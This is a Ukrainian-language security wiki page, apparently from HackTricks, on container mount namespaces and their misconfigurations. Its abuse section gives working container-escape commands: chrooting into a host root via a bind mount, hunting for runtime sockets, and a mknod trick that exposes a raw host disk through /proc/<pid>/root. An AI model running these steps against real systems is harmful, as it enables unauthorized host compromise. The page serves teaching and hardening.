# Простір імен монтування

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Простір імен монтування керує **таблицею монтувань**, яку бачить процес. Це одна з найважливіших функцій ізоляції контейнерів, оскільки коренева файлова система, bind mounts, монтування tmpfs, представлення procfs, доступ до sysfs і багато допоміжних монтувань, специфічних для runtime, відображаються саме в цій таблиці монтувань. Два процеси можуть одночасно мати доступ до `/`, `/proc`, `/sys` або `/tmp`, але те, до чого саме звертаються ці шляхи, залежить від простору імен монтування, у якому вони перебувають.

З погляду container-security, простір імен монтування часто є різницею між "акуратно підготовленою файловою системою застосунку" та "можливістю цього процесу безпосередньо бачити файлову систему хоста або впливати на неї". Саме тому bind mounts, томи `hostPath`, привілейовані операції монтування та доступні для запису представлення `/proc` або `/sys` пов'язані саме з цим простором імен.

## Робота

Коли runtime запускає контейнер, він зазвичай створює новий простір імен монтування, готує кореневу файлову систему для контейнера, за потреби монтує procfs та інші допоміжні файлові системи, а потім за бажанням додає bind mounts, монтування tmpfs, secrets, config maps або host paths. Після запуску процесу всередині цього простору імен набір монтувань, які він бачить, значною мірою відокремлений від стандартного представлення хоста. Хост усе ще може бачити реальну базову файлову систему, але контейнер бачить її версію, зібрану для нього runtime.

Це потужний механізм, оскільки він дає контейнеру змогу вважати, що він має власну кореневу файлову систему, хоча хост і надалі керує всім. Водночас це небезпечно, оскільки якщо runtime відкриє неправильне монтування, процес раптово отримає доступ до ресурсів хоста, для захисту яких решту моделі безпеки могли не розробляти.

## Лабораторна робота

Ви можете створити приватний простір імен монтування за допомогою:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Якщо відкрити інший shell за межами цього namespace і перевірити таблицю монтувань, ви побачите, що монтування tmpfs існує лише всередині ізольованого mount namespace. Це корисна вправа, оскільки вона показує, що ізоляція монтувань — не абстрактна теорія; kernel буквально надає процесу іншу таблицю монтувань.

Якщо відкрити інший shell за межами цього namespace і перевірити таблицю монтувань, монтування tmpfs існуватиме лише всередині ізольованого mount namespace.

Усередині контейнерів швидке порівняння:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Другий приклад демонструє, наскільки легко конфігурація runtime може створити величезну пролом у межі файлової системи.

## Використання runtime

Docker, Podman, стеки на базі containerd і CRI-O покладаються на приватний mount namespace для звичайних контейнерів. Kubernetes використовує той самий механізм для томів, projected secrets, config maps і монтувань `hostPath`. Середовища Incus/LXC також значною мірою покладаються на mount namespaces, особливо тому, що системні контейнери часто надають багатші та більш схожі на машинні файлові системи, ніж контейнери застосунків.

Це означає, що під час аналізу проблеми з файловою системою контейнера ви зазвичай маєте справу не з ізольованою особливістю Docker. Ви маєте справу з проблемою mount namespace і конфігурації runtime, яка проявляється через платформу, що запустила workload.

## Неправильні конфігурації

Найочевиднішою та найнебезпечнішою помилкою є відкриття кореневої файлової системи хоста або іншого чутливого шляху хоста через bind mount, наприклад `-v /:/host`, або writable `hostPath` у Kubernetes. На цьому етапі питання вже не в тому, «чи може контейнер якимось чином виконати escape?», а в тому, «яка корисна частина вмісту хоста вже безпосередньо видима та доступна для запису?». Writable bind mount хоста часто перетворює решту exploit на просте розміщення файлів, chrooting, зміну конфігурації або пошук runtime socket.

Ще однією поширеною проблемою є відкриття `/proc` або `/sys` хоста способами, що обходять безпечніше представлення контейнера. Ці файлові системи не є звичайними data mounts; вони є інтерфейсами до стану kernel і процесів. Якщо workload безпосередньо отримує доступ до версій хоста, багато припущень, на яких ґрунтується hardening контейнерів, перестають коректно діяти.

Захисти read-only також мають значення. Read-only root filesystem не робить контейнер автоматично безпечним, але прибирає значний обсяг простору для staging атак і ускладнює persistence, розміщення helper binaries та tampering конфігурації. І навпаки, writable root або writable bind mount хоста надає attacker простір для підготовки наступного кроку.

## Зловживання

Коли mount namespace використовується неправильно, attackers зазвичай роблять одну з чотирьох речей. Вони **читають data хоста**, які мали залишатися за межами контейнера. Вони **змінюють конфігурацію хоста** через writable bind mounts. Вони **монтують або перемонтовують додаткові resources**, якщо capabilities і seccomp це дозволяють. Або вони **отримують доступ до потужних sockets і runtime state directories**, які дають змогу попросити саму container platform надати їм ширший доступ.

Якщо контейнер уже бачить файлову систему хоста, модель безпеки одразу змінюється.

Якщо ви підозрюєте наявність host bind mount, спочатку перевірте, що саме доступно і чи доступне воно для запису:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Якщо коренева файлова система хоста змонтована з правами читання та запису, прямий доступ до хоста часто є таким простим:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Якщо метою є привілейований доступ до runtime, а не безпосереднє виконання chrooting, перелічіть сокети та стан runtime:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Якщо присутня `CAP_SYS_ADMIN`, також перевірте, чи можна створювати нові монтування зсередини контейнера:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Повний приклад: Two-Shell `mknod` Pivot

Більш спеціалізований шлях зловживання з’являється, коли root-користувач контейнера може створювати block devices, host і container коректно спільно використовують одну ідентичність користувача, а attacker уже має low-privilege foothold на host. У такій ситуації container може створити device node, наприклад `/dev/sda`, а low-privilege host user згодом може прочитати його через `/proc/<pid>/root/` для відповідного процесу container.

Усередині container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
З хоста, як відповідний користувач із низькими привілеями, після визначення PID оболонки контейнера:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Важливий висновок полягає не в точному пошуку рядка CTF. Він у тому, що доступ до mount namespace через `/proc/<pid>/root/` може дозволити користувачу хоста повторно використати вузли пристроїв, створені контейнером, навіть якщо політика пристроїв cgroup забороняла їх безпосереднє використання всередині самого контейнера.

## Перевірки

Ці команди потрібні, щоб показати, у якому саме представленні файлової системи фактично працює поточний процес. Мета — виявити монтування, похідні від хоста, доступні для запису чутливі шляхи та все, що виглядає ширшим за звичайну кореневу файлову систему контейнера прикладної програми.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Що тут важливо:

- Bind mounts із host, особливо `/`, `/proc`, `/sys`, директорії зі станом runtime або розташування socket, мають одразу привертати увагу.
- Неочікувані mounts із read-write зазвичай важливіші за велику кількість допоміжних mounts лише для читання.
- `mountinfo` часто є найкращим місцем, щоб визначити, чи походить шлях безпосередньо з host, чи підтримується overlay.

Ці перевірки визначають, **які ресурси видимі в цьому namespace**, **які з них походять із host** і **які з них доступні для запису або є чутливими з погляду безпеки**.
